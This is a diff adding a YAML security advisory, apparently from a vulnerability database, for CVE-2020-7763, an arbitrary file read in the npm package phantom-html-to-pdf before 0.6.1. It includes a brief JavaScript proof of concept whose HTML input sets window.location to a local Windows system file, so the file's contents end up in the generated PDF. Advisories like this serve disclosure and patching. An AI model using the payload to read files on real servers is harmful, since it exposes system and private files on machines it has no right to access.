@@ -1,0 +1,40 @@
+---
+- id: snykio:npm:phantom-html-to-pdf:1023598
+  title: Arbitrary File Read
+  description: |
+    [phantom-html-to-pdf][1] is a Convert html to pdf using phantomjs
+
+    Affected versions of this package are vulnerable to Arbitrary File Read.
+
+    ### PoC   {#poc}
+
+        var fs = require('fs')
+        var conversion = require("phantom-html-to-pdf")();
+        conversion.allowLocalFilesAccess = false
+        conversion({ html: "document.write(window.location='c:/windows/win.ini')" }, function(err, pdf) {
+        var output = fs.createWriteStream('output.pdf')
+        console.log(pdf.logs);
+        console.log(pdf.numberOfPages);
+        pdf.stream.pipe(output);
+        });
+
+
+
+    [1]: https://www.npmjs.org/package/phantom-html-to-pdf
+  affected_package: phantom-html-to-pdf
+  vulnerable_versions:
+  - "<0.6.1"
+  severity: high
+  package_manager: npm
+  cve:
+  - CVE-2020-7763
+  cwe:
+  - CWE-22
+  disclosed_date: 2020-10-29
+  created_date: 2020-11-05
+  last_modified_date: 2020-11-05
+  credit:
+  - Anand Namana
+  references:
+  - https://github.com/pofider/phantom-html-to-pdf/commit/b5d2da2639a49a95e0bdb3bc0c987cb6406b8259
+  source_url: https://snyk.io/vuln/SNYK-JS-PHANTOMHTMLTOPDF-1023598
